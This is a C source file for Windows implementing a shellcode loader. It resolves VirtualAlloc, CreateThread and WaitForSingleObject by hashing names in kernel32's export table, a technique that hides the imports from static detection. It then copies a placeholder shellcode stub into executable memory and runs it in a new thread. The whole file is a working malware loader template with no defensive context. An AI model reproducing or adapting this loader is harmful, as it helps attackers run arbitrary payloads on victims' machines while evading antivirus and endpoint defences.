#include <Windows.h>

typedef PVOID(WINAPI* PVirtualAlloc)(PVOID, SIZE_T, DWORD, DWORD);
typedef PVOID(WINAPI* PCreateThread)(PSECURITY_ATTRIBUTES, SIZE_T, PTHREAD_START_ROUTINE, PVOID, DWORD, PDWORD);
typedef PVOID(WINAPI* PWaitForSingleObject)(HANDLE, DWORD);

unsigned int hash(const char* str)
{
	unsigned int hash = 7759;
	int c;

	while (c = *str++)
		hash = ((hash << 5) + hash) + c;

	return hash;
}

void main()
{
	HMODULE hKernel32 = GetModuleHandle(L"kernel32.dll");
	PVirtualAlloc funcVirtualAlloc;
	PCreateThread funcCreateThread;
	PWaitForSingleObject funcWaitForSingleObject;

	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hKernel32;
	PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)((PBYTE)hKernel32 + pDosHeader->e_lfanew);
	PIMAGE_OPTIONAL_HEADER pOptionalHeader = (PIMAGE_OPTIONAL_HEADER) & (pNtHeader->OptionalHeader);
	PIMAGE_EXPORT_DIRECTORY pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)hKernel32 + pOptionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
	PULONG pAddressOfFunctions = (PULONG)((PBYTE)hKernel32 + pExportDirectory->AddressOfFunctions);
	PULONG pAddressOfNames = (PULONG)((PBYTE)hKernel32 + pExportDirectory->AddressOfNames);
	PUSHORT pAddressOfNameOrdinals = (PUSHORT)((PBYTE)hKernel32 + pExportDirectory->AddressOfNameOrdinals);

	for (int i = 0; i < pExportDirectory->NumberOfNames; ++i)
	{
		PCSTR pFunctionName = (PSTR)((PBYTE)hKernel32 + pAddressOfNames[i]);
		if (hash(pFunctionName) == 0x80fa57e1)
		{
			funcVirtualAlloc = (PVirtualAlloc)((PBYTE)hKernel32 + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
		}
		if (hash(pFunctionName) == 0xc7d73c9b)
		{
			funcCreateThread = (PCreateThread)((PBYTE)hKernel32 + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
		}
		if (hash(pFunctionName) == 0x50c272c4)
		{
			funcWaitForSingleObject = (PWaitForSingleObject)((PBYTE)hKernel32 + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
		}
	}

	unsigned char shellcode[] = "\\xfc\\x48\\x83";

	PVOID shellcode_exec = funcVirtualAlloc(0, sizeof shellcode, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	memcpy(shellcode_exec, shellcode, sizeof shellcode);
	DWORD threadID;
	HANDLE hThread = funcCreateThread(NULL, 0, (PTHREAD_START_ROUTINE)shellcode_exec, NULL, 0, &threadID);
	funcWaitForSingleObject(hThread, INFINITE);
}